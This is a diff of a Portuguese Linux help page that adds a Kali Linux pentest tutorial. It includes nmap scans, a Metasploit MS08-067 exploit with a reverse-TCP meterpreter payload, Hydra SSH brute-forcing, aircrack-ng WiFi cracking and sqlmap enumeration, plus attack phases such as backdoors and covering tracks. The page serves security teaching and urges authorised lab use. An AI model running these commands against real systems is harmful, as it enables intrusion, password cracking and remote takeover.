@@ -6,6 +6,7 @@
 <title>Linux - Portal Suporte Técnico</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
 <style>
+  /* Mesma estilização que você já tinha... (vou omitir para foco no conteúdo) */
   :root {
     /* Cores modo escuro */
     --bg-dark: #121212;
@@ -341,11 +342,11 @@
     <li><a href="#comandos-basicos">Comandos Básicos</a></li>
     <li><a href="#comandos-intermediarios">Comandos Intermediários</a></li>
     <li><a href="#comandos-avancados">Comandos Avançados</a></li>
-    <li><a href="#ferramentas">Ferramentas Importantes</a></li>
+    <li><a href="#flags-e-sintaxes">Flags e Sintaxes Importantes</a></li>
+    <li><a href="#ferramentas-kali">Ferramentas Kali Linux</a></li>
     <li><a href="#exemplos-praticos">Exemplos Práticos</a></li>
     <li><a href="#dicas">Dicas e Boas Práticas</a></li>
     <li><a href="#ataques-pentest">Tipos de Ataques e Pentest</a></li>
-    <li><a href="#uso-ferramentas">Uso Ferramentas Kali Linux</a></li>
   </ul>
 </aside>
 
@@ -399,84 +400,135 @@
     </thead>
     <tbody>
       <tr><td><code>ssh</code></td><td>Acesso remoto seguro</td><td><code>ssh user@192.168.1.10</code></td></tr>
-      <tr><td><code>rsync</code></td><td>Sincronização de arquivos</td><td><code>rsync -avz /origem /destino</code></td></tr>
-      <tr><td><code>iptables</code></td><td>Configura firewall</td><td><code>iptables -L</code></td></tr>
-      <tr><td><code>systemctl</code></td><td>Gerencia serviços do sistema</td><td><code>systemctl status apache2</code></td></tr>
-      <tr><td><code>journalctl</code></td><td>Visualiza logs do sistema</td><td><code>journalctl -xe</code></td></tr>
-      <tr><td><code>netstat</code></td><td>Mostra conexões de rede</td><td><code>netstat -tulnp</code></td></tr>
-      <tr><td><code>tcpdump</code></td><td>Captura pacotes de rede</td><td><code>tcpdump -i eth0</code></td></tr>
-      <tr><td><code>mount</code></td><td>Montar sistemas de arquivos</td><td><code>mount /dev/sdb1 /mnt/usb</code></td></tr>
-      <tr><td><code>umount</code></td><td>Desmontar sistemas de arquivos</td><td><code>umount /mnt/usb</code></td></tr>
-      <tr><td><code>sudo</code></td><td>Executa comandos com privilégios de superusuário</td><td><code>sudo apt update</code></td></tr>
+      <tr><td><code>rsync</code></td><td>Sincronização de arquivos</td><td><code>rsync -av /origem /destino</code></td></tr>
+      <tr><td><code>iptables</code></td><td>Configura firewall Linux</td><td><code>iptables -L</code></td></tr>
+      <tr><td><code>netstat</code></td><td>Visualiza conexões de rede</td><td><code>netstat -tulnp</code></td></tr>
+      <tr><td><code>curl</code></td><td>Transferência de dados de URLs</td><td><code>curl -I https://example.com</code></td></tr>
+      <tr><td><code>wget</code></td><td>Baixa arquivos da internet</td><td><code>wget https://site.com/arquivo.zip</code></td></tr>
+      <tr><td><code>strace</code></td><td>Rastreia chamadas de sistema</td><td><code>strace -p 1234</code></td></tr>
+      <tr><td><code>tcpdump</code></td><td>Captura pacotes de rede</td><td><code>tcpdump -i eth0 -w captura.pcap</code></td></tr>
+      <tr><td><code>journalctl</code></td><td>Visualiza logs do systemd</td><td><code>journalctl -xe</code></td></tr>
+      <tr><td><code>useradd</code></td><td>Cria novo usuário</td><td><code>sudo useradd -m felipe</code></td></tr>
     </tbody>
   </table>
 
-  <h2 id="ferramentas">Ferramentas Importantes</h2>
+  <h2 id="flags-e-sintaxes">Flags e Sintaxes Importantes</h2>
+  <p>Entender flags comuns e sintaxes facilita o uso das ferramentas. Exemplos:</p>
   <ul>
-    <li><strong>nmap:</strong> Scanner de rede para descobrir hosts e serviços.</li>
-    <li><strong>wireshark:</strong> Analisador de pacotes para monitoramento de rede.</li>
-    <li><strong>tcpdump:</strong> Captura e analisa pacotes via linha de comando.</li>
-    <li><strong>curl:</strong> Transfere dados de URLs.</li>
-    <li><strong>ssh:</strong> Acesso remoto seguro.</li>
+    <li><code>-v</code>: modo verbose (mais detalhado)</li>
+    <li><code>-h</code> ou <code>--help</code>: ajuda</li>
+    <li><code>-r</code>: recursivo</li>
+    <li><code>-f</code>: força operação</li>
+    <li><code>-i</code>: interface de rede (em ferramentas de rede)</li>
+    <li><code>-p</code>: porta</li>
+    <li><code>-o</code>: output (arquivo de saída)</li>
   </ul>
 
-  <h2 id="exemplos-praticos">Exemplos Práticos</h2>
-  <p>Para listar arquivos ocultos em um diretório:</p>
-  <pre><code>ls -la /home/usuario</code></pre>
-  <p>Para copiar arquivos e preservar permissões:</p>
-  <pre><code>cp -a /origem/arquivo.txt /destino/</code></pre>
-  <p>Para monitorar processos em tempo real:</p>
-  <pre><code>top</code></pre>
+  <h2 id="ferramentas-kali">Ferramentas Kali Linux Importantes</h2>
+  <ul>
+    <li><strong>Nmap</strong> - Scanner de portas e serviços</li>
+    <li><strong>Metasploit Framework</strong> - Exploração de vulnerabilidades</li>
+    <li><strong>Hydra</strong> - Ataques de força bruta</li>
+    <li><strong>Nikto</strong> - Scanner de vulnerabilidades web</li>
+    <li><strong>Aircrack-ng</strong> - Ataques em redes WiFi</li>
+    <li><strong>Sqlmap</strong> - Testes de injeção SQL</li>
+    <li><strong>Wireshark</strong> - Análise de tráfego de rede</li>
+    <li><strong>John the Ripper</strong> - Cracking de senhas</li>
+  </ul>
+
+  <h2 id="exemplos-praticos">Exemplos Práticos de Uso Kali Linux</h2>
+
+  <h3 id="nmap-avancado">Nmap Avançado</h3>
+  <p>Scan simples para descobrir hosts ativos:</p>
+  <pre><code>nmap -sn 192.168.1.0/24</code></pre>
+  <p>Scan detalhado com detecção de sistema e versão:</p>
+  <pre><code>nmap -sS -sV -O -p 1-65535 192.168.1.100</code></pre>
+  <p>Scan stealth (SYN scan) para portas comuns:</p>
+  <pre><code>nmap -sS -p 22,80,443 10.0.0.5</code></pre>
+
+  <h3 id="metasploit">Metasploit Framework</h3>
+  <pre><code>msfconsole
+use exploit/windows/smb/ms08_067_netapi
+set RHOST 192.168.1.10
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+exploit
+</code></pre>
+  <p>Comandos básicos:</p>
+  <ul>
+    <li><code>search</code>: procura exploits</li>
+    <li><code>use</code>: seleciona exploit ou payload</li>
+    <li><code>show options</code>: mostra opções configuráveis</li>
+    <li><code>set</code>: define valores</li>
+    <li><code>exploit</code>: executa o ataque</li>
+  </ul>
+
+  <h3 id="hydra">Hydra - Ataques de Força Bruta</h3>
+  <pre><code>hydra -l admin -P /path/dicionario.txt 192.168.1.10 ssh</code></pre>
+  <p>Parâmetros comuns:</p>
+  <ul>
+    <li><code>-l</code>: usuário</li>
+    <li><code>-L</code>: arquivo com lista de usuários</li>
+    <li><code>-p</code>: senha única</li>
+    <li><code>-P</code>: arquivo com lista de senhas</li>
+    <li><code>-t</code>: número de threads</li>
+  </ul>
+
+  <h3 id="nikto">Nikto - Scanner Web</h3>
+  <pre><code>nikto -h http://192.168.1.10</code></pre>
+  <p>Verifica vulnerabilidades, diretórios e configurações erradas em servidores web.</p>
+
+  <h3 id="aircrack-ng">Aircrack-ng - Ataques WiFi</h3>
+  <p>Coloque a interface wireless em modo monitor:</p>
+  <pre><code>airmon-ng start wlan0</code></pre>
+  <p>Capture pacotes:</p>
+  <pre><code>airodump-ng wlan0mon</code></pre>
+  <p>Execute ataque de captura de handshake e quebras:</p>
+  <pre><code>aircrack-ng -w /path/dicionario.txt captura.cap</code></pre>
+
+  <h3 id="sqlmap">Sqlmap - Injeção SQL</h3>
+  <pre><code>sqlmap -u "http://site.com/page.php?id=1" --dbs</code></pre>
+  <p>Lista bancos de dados da aplicação vulnerável.</p>
 
   <h2 id="dicas">Dicas e Boas Práticas</h2>
   <ul>
-    <li>Use sempre privilégios mínimos necessários.</li>
-    <li>Faça backup antes de alterar arquivos importantes.</li>
-    <li>Use chaves SSH para autenticação segura.</li>
-    <li>Verifique permissões de arquivos regularmente.</li>
-    <li>Mantenha seu sistema atualizado.</li>
+    <li>Sempre tenha permissão para realizar testes (pentest legal).</li>
+    <li>Use ambientes virtuais para testes e não em redes de produção.</li>
+    <li>Documente seus testes e resultados.</li>
+    <li>Mantenha suas ferramentas Kali atualizadas com <code>apt update && apt upgrade</code>.</li>
+    <li>Aprenda sobre redes, sistemas e segurança para complementar o uso das ferramentas.</li>
+    <li>Foque em entender o funcionamento dos comandos antes de rodar ataques.</li>
   </ul>
 
   <h2 id="ataques-pentest">Tipos de Ataques e Pentest</h2>
+  <p>Os principais tipos são:</p>
   <ul>
-    <li>Phishing, ataques de força bruta, injeção de comandos.</li>
-    <li>Escalada de privilégios e análise de vulnerabilidades.</li>
-    <li>Utilização de ferramentas como Metasploit e Nmap para pentest.</li>
+    <li><strong>Reconhecimento:</strong> coleta de informações (ex: Nmap, Whois)</li>
+    <li><strong>Varredura:</strong> busca por vulnerabilidades (ex: Nikto, OpenVAS)</li>
+    <li><strong>Ganho de Acesso:</strong> exploração (ex: Metasploit)</li>
+    <li><strong>Manutenção de Acesso:</strong> instalação de backdoors, persistência</li>
+    <li><strong>Limpeza:</strong> remoção de rastros</li>
   </ul>
 
-  <h2 id="uso-ferramentas">Uso Ferramentas Kali Linux</h2>
-  <p>No Kali Linux, ferramentas como nmap, wireshark e metasploit são fundamentais para testes de penetração e análise de redes.</p>
-
-  <a href="index.html" class="button-back" aria-label="Voltar para página inicial">← Voltar ao Início</a>
+  <a href="index.html" class="button-back">Voltar ao Início</a>
 </main>
 
 <script>
-  const toggleBtn = document.getElementById('toggle-theme');
-  const body = document.body;
-
-  function updateToggleButton(isDark) {
-    toggleBtn.classList.toggle('dark', isDark);
-    toggleBtn.innerHTML = `
-      <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
-        <path d="M12 3v2m6.364 1.636l-1.414 1.414M21 12h-2M17.364 17.364l-1.414-1.414M12 19v2M6.636 17.364l1.414-1.414M3 12H1m4.95-4.95l1.414 1.414" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-      </svg> ${isDark ? 'Modo Claro' : 'Modo Escuro'}
-    `;
-  }
-
-  const savedTheme = localStorage.getItem('theme');
-  if (savedTheme === 'dark') {
-    body.classList.add('dark');
-    updateToggleButton(true);
-  } else {
-    body.classList.remove('dark');
-    updateToggleButton(false);
-  }
-
-  toggleBtn.addEventListener('click', () => {
-    const isDark = body.classList.toggle('dark');
-    updateToggleButton(isDark);
-    localStorage.setItem('theme', isDark ? 'dark' : 'light');
+  // Toggle tema claro/escuro
+  const btn = document.getElementById('toggle-theme');
+  btn.addEventListener('click', () => {
+    document.body.classList.toggle('dark');
+    if(document.body.classList.contains('dark')) {
+      btn.textContent = 'Modo Claro';
+      btn.classList.add('dark');
+    } else {
+      btn.textContent = 'Modo Escuro';
+      btn.classList.remove('dark');
+    }
   });
+
+  // Animação fadeIn já feita no CSS
 </script>
+
 </body>
 </html>
